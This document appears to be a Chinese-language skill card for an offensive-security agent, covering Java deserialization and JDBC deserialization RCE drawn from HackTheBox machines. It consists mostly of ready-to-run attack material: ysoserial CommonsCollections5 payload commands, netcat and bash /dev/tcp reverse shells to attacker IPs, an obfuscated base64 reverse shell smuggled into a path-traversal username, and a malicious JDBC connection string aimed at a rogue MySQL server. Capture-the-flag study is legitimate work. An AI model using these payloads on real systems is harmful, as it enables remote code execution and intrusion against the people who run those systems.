---
name: 'java-native-deserialization'
description: 'Java 反序列化 RCE 的两个入口：可控 ObjectInputStream.readObject()（参数/JWT 里出现 rO0AB 开头、或 base64 -d 后 file 报 "Java serialization data, version 5"）与可控 JDBC URL（autoDeserialize=true + ServerStatusDiffInterceptor + 自建恶意 MySQL 回传 payload）。含 ysoserial gadget 选型与 classpath 判断。（检索词：ysoserial/CommonsCollections/CommonsCollections5/CC5/readObject/ObjectInputStream/java deserialization/autoDeserialize/queryInterceptors/ServerStatusDiffInterceptor/JDBC 注入/恶意 MySQL/Java 反序列化/原生反序列化/JDBC 反序列化/gadget 链/反序列化 RCE/java-deserialization/java native deserialization）'
whenToUse: '参数、cookie 或 JWT 字段里出现 rO0AB/AC ED 00 05、或"Java serialization data"字样；或配置页/接口能改 JDBC 连接串（mysql.host 之类）；或反编译出的源码里有 new ObjectInputStream(...).readObject() 时加载。'
metadata: { domain: web, tier: T2 }
---

# Java 原生反序列化与 JDBC 反序列化

> 来自 Insane 官方 WP 逐台回核,**3 台命中**:Fatty / Fingerprint / RegistryTwo

## 触发信号

| 观察到的现象 | 出处 |
|---|---|
| 参数/JWT 字段 base64 解码后以 `AC ED 00 05` 开头(`rO0AB...`),`file` 认成 `Java serialization data, version 5` | Fingerprint(JWT 载荷 base64 -d 后 `file` 直接认出) |
| 反编译出的服务端源码里 `new ObjectInputStream(bIn).readObject()`,前面只做了 `Base64.getDecoder().decode()` | Fatty(`changePW`) |
| 应用**自己的类**里实现了 `readObject()`,且字段被拼进命令串/路径串 | Fingerprint(`UserProfileStorage.readObject()` → `readProfile()`) |
| 源码里出现 `jdbc:mysql://%s:%d/%s?...` 这类用变量拼出来的连接串,且有 Settings/`/reconfigure` 一类接口可改该变量 | RegistryTwo(`HibernateUtils.class`) |
| 依赖清单里有 `mysql-connector-java`(RegistryTwo 是 jdbc `8.0.17`);能拉到可反编译的 JAR/WAR(`docker cp`、`/backups`、私有 registry) | RegistryTwo / Fatty |
| 目标是 Java 应用(JSESSIONID、`.war`、Tomcat/GlassFish/Hibernate)且**能连到你的监听端口** | 三台都是 |

## 与已有卡的分工

- `dotnet-pipe-yaml-deserialization` 是 **.NET YAML**(Odyssey 的 YamlDotNet tag 直通 `Type.GetType`),**不是 Java**;本卡只管 JVM 侧。
- `web-attacks` 只在 OWASP 映射里**泛泛提了一句**反序列化;gadget 选型、ysoserial、JDBC 回传要看本卡。
- 同样"可控 JDBC URL"但**不需要回连**的另一条路见 `h2-java-alias-rce`(`CREATE ALIAS`)。
- Windows 侧对照一句带过:Perspective 用 `ysoserial.net` 打 ViewState(先要 machineKey);Odyssey 用 YAML `ObjectDataProvider`。

## 前置验证

```bash
# 1) 确认是 Java 序列化,不是别的编码
echo '<参数里的 base64>' | base64 -d > /tmp/blob; file /tmp/blob
# → Java serialization data, version 5   (魔数 AC ED 00 05,base64 前缀 rO0AB)

# 2) 拿到源码,定 classpath —— classpath 决定能用哪条 gadget 链
unzip -l app.war | grep -iE 'commons-collections|commons-beanutils|mysql-connector|spring|groovy'
jd-gui app.war          # Fatty/RegistryTwo 都是反编译 WAR/JAR 后白盒定位入口

# 3) 确认目标 Java / 依赖版本,payload 必须用同版本生成(否则静默失败)
docker cp registrytwo:/usr/local/tomcat/webapps/hosting.war .

# 4) 确认能回连(JDBC 模式还要目标能连到你的恶意 MySQL 端口)
nc -lvnp 9001
```

## 模式 1: 原生反序列化 —— 输入直进 `readObject()`,用现成 gadget 链

条件:可控输入被反序列化,**且** classpath 里有可利用的第三方库。

```bash
# Fatty:changePW 服务端把 Base64 输入解码后直接
#   new ObjectInputStream(bIn).readObject()
# 改写客户端 changePW(String payload) 只透传参数,然后:
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'nc 10.10.14.13 1234 -e /bin/sh' | base64 -w0
# 把输出当 changePW 参数发出 → qtc 的 shell
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fatty | `changePW` 无白名单直接 `readObject()`;`CommonsCollections5` 链生成单条命令 `nc ... -e /bin/sh`,base64 后发送 |

## 模式 2: 自定义 gadget —— 没有现成链,但应用自己的 `readObject()` 拼字符串/路径

条件:classpath 里没有通用链,或链被过滤;但应用类里 `readObject()` 的字段参与了**命令拼接或路径拼接**。

```bash
# Fingerprint:JWT 的 user 字段 base64 -d 后 file 报 "Java serialization data, version 5"
# 源码:
#   UserProfileStorage.readObject() → readProfile()
#     profile.isAdminProfile() 为真时执行 "cat " + AUTH_LOG + " | grep " + user.getUsername()
#   getProfileLocation() = dir.getAbsolutePath() + "/" + username + ".ser"
# 用 8080 /backups 下载到的 User.java / Profile.java / UserProfileStorage.java 建 Maven 工程,
# 自写 FileUtil/SerUtils,把 username 造成路径穿越 + 命令替换:
../../../../../$(echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjMxLzc3NzcgMD4mMQ== | base64 -d | bash)/../../../data/uploads/profile
mvn package     # 生成 profile.ser(adminProfile=true)与恶意 UserProfileStorage,base64 后替换 JWT 的 user 字段
nc -lnvp 7777   # 刷新页面即得 www-data 反弹 shell
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fingerprint | 泄露 `SECRET_KEY` → 任意伪造 JWT → 把"允许上传的序列化文件"接到完全可控的 `ObjectInputStream`;`username` 同时承担路径穿越与 `$(...)` 命令替换 |

## 模式 3: JDBC 反序列化 —— `autoDeserialize=true` + 恶意 MySQL(**认证后**也能用)

条件:能改 JDBC 连接串(主机/端口/参数),且 `mysql-connector-java` 支持 `queryInterceptors` 与 `autoDeserialize`。**不需要任何现成的 gadget 入口**。

```bash
# RegistryTwo:HibernateUtils.class 用 mysql.host 拼
#   jdbc:mysql://%s:%d/%s?allowPublicKeyRetrieval=true&useSSL=false&serverTimezone=Europe/Rome
# jdbc 8.0.17 → 存在 JDBC 反序列化 RCE

# 1) 用与目标完全一致的容器和 Java 版本生成 payload
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c {echo,$(echo -n 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'|base64)}|{base64,-d}|{bash,-i}" > payload.ser
docker cp registrytwo:/tmp/payload.ser .

# 2) 攻击机起自建恶意 MySQL(监听 9003),把 payload.ser 放进 SHOW SESSION STATUS 的响应
python2.7 poc.py & ; nc -lvnp 9001

# 3) 通过 Configuration 接口提交
POST /hosting/reconfigure
mysql.host=10.10.14.6:9003/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true#
# → uid=1000(app) shell
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| RegistryTwo | 先靠 Tomcat `..;/` 触达遗留 Sessions servlet 写入 `s_IsLoggedInUserRoleManager=true`,才拿到 `/reconfigure`;随后 `mysql.host` 指向恶意 MySQL(`poc.py`,9003) |

> Toby 也用了恶意 MySQL(`Rogue-MySQL-Server`),但目的是**抓 `mysql_native_password` 的两个 salt 做离线爆破**,不回传序列化数据——别把两者混为一谈。

## 模式 4: gadget 可用性判断(classpath × 版本区间)

```bash
unzip -l target.war | grep -iE 'commons-collections'
# commons-collections 3.1 - 3.2.1 → CC1..CC7 系可用
# CommonsCollections5 = BadAttributeValueExpException + TiedMapEntry/LazyMap,
#   不依赖 AnnotationInvocationHandler,JDK 8u71 之后仍可用 → Fatty/RegistryTwo 都用它
# CommonsCollections1/3 依赖 AnnotationInvocationHandler,8u71 起失效
# 没有 CC → 换 commons-beanutils / spring-aop / groovy 链,或回到模式 2 自己造
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Fatty / RegistryTwo | 两台都直接选中 `CommonsCollections5`;RegistryTwo 明确要求"用与目标一致的容器与 Java 版本生成 payload" |

## 快速检查清单

```bash
[ ] 参数/cookie/JWT 里 base64 -d 后是否 AC ED 00 05 / 是否 file 认出 Java serialization
[ ] 源码里 new ObjectInputStream(...).readObject() 在哪、入口怎么触达
[ ] 应用自有类里有没有 readObject(),字段是否进命令/路径拼接(自定义 gadget 候选)
[ ] 有没有可控 JDBC URL(B 计划,认证后也能打)
[ ] classpath:commons-collections 版本 / mysql-connector 版本
[ ] 能否拿到同版本的 jar/容器来生成 payload
[ ] 出站是否允许回连(JDBC 模式还要允许目标连你的 MySQL 端口)
```

## 教训

1. **Java 原生反序列化没有白名单时,classpath 里的 `CommonsCollections` 就是 RCE** —— 先看依赖再看协议。
2. **不一定需要现成 gadget 链**:只要应用里有 `readObject()`,且其字段参与字符串拼接或路径拼接,就能拼出自定义 gadget(Fingerprint 的 `username` = 路径穿越 + `$(...)`)。
3. **JDBC 反序列化是完全不同的入口**:可控连接串 + `queryInterceptors=...ServerStatusDiffInterceptor&autoDeserialize=true` + 恶意 MySQL,在 `SHOW SESSION STATUS` 响应里塞序列化数据即可触发,**认证后**也是一条独立路径。
4. 🔴 **Java/JDK 与依赖版本决定 gadget**:payload 必须用与目标一致的容器和 Java 版本生成,否则**静默失败**(无报错、无回显)。
5. 🔴 **CommonsCollections 各版本差异**:3.1–3.2.1 才有完整链;3.2.2 修掉了 `InvokerTransformer` 的序列化。选链前先确认版本区间。
6. 🔴 **高版本 JDK 的两重限制**:模块化让部分老链失效;JDK 9+ 的 `ObjectInputFilter` 一旦配置全局白名单,通用链全部报废。
7. 🔴 **恶意 MySQL 需要目标能连到你的端口**(RegistryTwo 用 9003);目标出站受限时换端口或借已通的服务中转。
8. `readObject()` 在**反序列化的那一刻**执行,不依赖返回值 —— 不要因为"看不出回显"就判死。

## 相关卡

- `h2-java-alias-rce` —— 同样是可控 JDBC URL,但用 `CREATE ALIAS` 执行命令,不需要回连
- `dotnet-pipe-yaml-deserialization` —— 换成 .NET:YamlDotNet tag 直通 `Type.GetType` 的 `ObjectDataProvider`
- `log4shell-cve-2021-44228` —— 另一个 Java 侧的"数据被解释成类加载"入口(JNDI)
- `web-attacks` —— 需要先做整体 Web 面枚举/技术栈识别时
- `apache-struts-rce` —— 目标若是 Struts,OGNL 注入通常比等一个反序列化点更快
- `service-attacks` —— Tomcat 反代、`..;/` 路径穿越等前置条件
